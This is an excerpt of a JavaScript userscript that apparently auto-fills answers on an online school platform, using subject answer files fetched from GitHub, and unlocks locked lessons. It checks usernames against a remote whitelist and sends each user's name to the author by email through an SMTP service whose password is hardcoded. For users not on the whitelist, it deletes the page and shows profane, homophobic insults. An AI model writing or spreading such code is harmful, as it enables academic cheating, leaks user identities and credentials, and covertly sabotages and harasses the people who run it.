(function() {
    (async () => {
        ...
        const ADVT = {
            BI: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/BIOLOGY.txt").then(r => r.text()),
            AR: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/ARABIC.txt").then(r => r.text()),
            EA: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/ENGLISH.txt").then(r => r.text()),
            IS: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/ISLAMIC_STUDIES.txt").then(r => r.text()),
            MA: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/MATH.txt").then(r => r.text()),
            PH: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/PHYSICS.txt").then(r => r.text()),
            SS: await fetch("https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/8f573d3c80e5821c23f1daaaefbaeec89e69b06e/SOCIAL_STUDIES.txt").then(r => r.text())
        };
        let wait = await fetch('https://raw.githubusercontent.com/PurpleDaddy/Purple-Daddy-On-Poki/6e6d0773ff4cc83c5e7cf3fd6b1b90f047844816/White%20Listed').then(r => r.text())
        ...
        waitForElm('.home-page-header__name').then((elm) => {
            if (wait.includes(document.querySelector('.home-page-header__name').innerText)) {
                Email.send({
                    Host : "smtp.elasticemail.com",
                    Username : "redvented714@gmail.com",
                    Password : "E8881C5BFE7F21838D031B787AE1761F9B75",
                    To : 'redvented714@gmail.com',
                    From : "redvented714@gmail.com",
                ...
                function solver(mode) {
                    ADVT['pdf'] = ADVT[document.querySelector('[data-testid="question-renderer"] div').dataset.testid.substring(18,20)]
                    document.querySelectorAll(mode).forEach(Question => {
                        ...
                        answer.forEach(ans => {
                            ...
                            if (text.querySelector('img')) {
                                if (text.querySelector('img').src == ans.split('¬')[0]) {
            	...
            	document.addEventListener('keydown', function(e) {
            			...
            			if (document.getElementsByClassName('react-select__menu')[0]) {
            				...
            				lessonCards.forEach(Element => {if(Element.innerText.includes("Locked")){Element.remove()}})
                ...
                let username = document.querySelector('.home-page-header__name').innerText
                Email.send({
                    Host : "smtp.elasticemail.com",
                    Username : "redvented714@gmail.com",
                    Password : "E8881C5BFE7F21838D031B787AE1761F9B75",
                    To : 'redvented714@gmail.com',
                    From : "redvented714@gmail.com",
                    Subject : username + '... Who INVITED HIM IS GAY',
                    Body : username + '... Who INVITED HIM IS GAY'
                });
                document.querySelector('*').remove()
                setTimeout(function(){alert('FUCK YOU '+ username)},10)
            }
        })
    })();
})();
